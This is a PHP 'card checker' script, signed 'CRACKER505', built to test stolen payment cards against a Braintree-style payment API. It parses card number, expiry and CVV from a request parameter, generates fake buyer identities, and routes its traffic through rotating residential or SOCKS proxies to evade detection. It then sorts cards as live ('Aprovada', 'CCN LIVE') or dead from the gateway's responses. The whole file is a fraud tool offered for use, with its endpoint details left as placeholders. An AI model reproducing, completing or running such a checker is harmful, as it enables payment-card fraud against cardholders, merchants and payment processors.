<?php


///////////////====== By 👑 CRACKER505 👑 ===============\\\\\\\\\\\\\\\

//// BRAINTREE RAW API

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mm = multiexplode(array(":", "|", ""), $lista)[1];
$yy = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function cracker505proxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = cracker505proxys();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

$username = 'Put Zone Username Here';
$password = 'Put Zone Password Here';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
////////////////////////////==============[Proxy Section]===============//////////////////////////////

/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
/////////========== WEBSHARE PROXY =========\\\\\\\\\\
curl_setopt($ch, CURLOPT_PROXY, 'socks5://p.webshare.io:1080');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'user:pass');  // ENTER WEBSHARE DETAILS
//////////////==================[END OF PROXY SELECTION]=================//////////////

curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_URL, '............');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '........');

$headers = array();

$headers[] = 'Accept: ...................';

$headers[] = 'Authorization: ............';

$headers[] = 'Accept-language: ..........';

$headers[] = 'Braintree-version: ........';

$headers[] = 'Content-Type: .............';

$headers[] = 'Origin: ...................';

$headers[] = 'Referer: ..................';

$headers[] = 'Sec-Fetch-Mode: cors';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"token":"','"')));




////////////////////////////===============[For Charging Cards]=============////////////////////////

$ch = curl_init();
////////////////////////////==============[Proxy Section]===============//////////////////////////////

/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
/////////========== WEBSHARE PROXY =========\\\\\\\\\\
curl_setopt($ch, CURLOPT_PROXY, 'socks5://p.webshare.io:1080');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'user:pass');  // ENTER WEBSHARE DETAILS
//////////////==================[END OF PROXY SELECTION]=================//////////////

curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_URL, '............');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '........');

$headers = array();

$headers[] = 'Accept: ................';

$headers[] = 'Authorization: .........';

$headers[] = 'Host: ..................';

$headers[] = 'Content-Type: ..........';

$headers[] = 'Origin: ................';

$headers[] = 'Referer: ...............';

$headers[] = 'Sec-Fetch-Mode: cors';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
$message = trim(strip_tags(getStr($result,'"cvv_result":{"code":"','"')));
$avs = trim(strip_tags(getStr($result,'"avs_result":{"code":"','"')));


////////////////////////////===[Bin Lookup ]
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/' . $cctwo . '');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim, true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];
$cctype = $fim['scheme'];
$brand = $fim['brand'];
$emoji = $fim['emoji'];


$cctype = strtoupper($cctype);
$type = strtoupper($type);
$brand = strtoupper($brand);

////////////////////////=================[Card Response Start]==================/////////////////////////////////

if (strpos($result, 'M')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Authorized [CVV-'.$message.'/AVS-'.$avs.']</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
} 
  
elseif (strpos($result, '1000')) {
   echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">CVC MATCHED</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
} 

elseif (strpos($result, '"result":true')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">CVC MATCHED</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}

elseif (strpos($result, 'Postal code.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">CVC MATCHED</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}

elseif (strpos($result, 'Do Not Honor')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">CVC MATCHED</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}

elseif (strpos($result, 'Gateway Rejected: avs')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">CVC MATCHED - AVS FAILED</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}

elseif (strpos($result, "Insufficient Funds")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Insufficient Funds</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}

elseif (strpos($result, 'Processor Declined')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">CCN LIVE</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}

elseif (strpos($result, 'Card Issuer Declined CVV')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">CCN LIVE</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}

elseif (strpos($result, 'Gateway Rejected: avs_and_cvv')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">CCN LIVE</span> |  <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
}

elseif (strpos($result, 'Your card has expired.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> | <span class="badge badge-warning">Expired Card</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, "expired_card")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Expired Card</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, '"param": "exp_year"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Expired Card</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, '"param": "exp_month"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Expired Card</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, 'Your card number is incorrect.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Incorrect Card Number</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, "incorrect_number")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Incorrect Card Number</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, "service_not_allowed")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Service Not Allowed</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, '"code": "card_declined"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Declined : Do_Not_Honor</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, 'Your card was declined.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Card Declined</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, "generic_decline")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Declined : Generic_Decline</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, '"cvc_check": "unavailable"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">CVC_Check : Unavailable</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, '"cvc_check": "unchecked"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">CVC_Unchecked</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, '"cvc_check": "fail"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">CVC_Unchecked : Fail</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, "parameter_invalid_empty")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Declined : Missing Card Details</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, "lock_timeout")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Another Request In Process : Card Not Checked</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, 'Your card does not support this type of purchase.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Card Does not Support Purchase</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, "transaction_not_allowed")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Card Does not Support Purchase</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, "three_d_secure_redirect")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Card Does not Support Purchase</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, 'Card is declined by your bank, please contact them for additional information.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">3D Secure Redirect</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, "missing_payment_information")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Missing Payment Informations</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, "Payment cannot be processed, missing credit card number")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Missing Credit Card Number</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, "Your card number is incorrect.")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Incorrect Card Number</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  elseif (strpos($result, "400 Bad Request")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">400 Bad Request</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  } 
  
  
  else {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">BRAINTREE</span> |  <span class="badge badge-warning">Dead Proxy/Error Not listed</span> | <span class="badge badge-info">[ Card: ' . $cctype . ' | Type: ' . $type . ' | Level: ' . $brand . ' | Bank: ' . $bank . ' | Country: ' . $country . ' ] </span> | <span class="badge badge-success"> 👑 CRACKER505 👑 </span></br>';
  }

////////////////////////=================[Card Response End]==================/////////////////////////////////
curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
//echo $result 

////////////////================[BRAINTREE RAW API]==============////////////
///////////////////////////////////////////////====== By CRACKER505===============\\\\\\\\\\\\\\\
?>
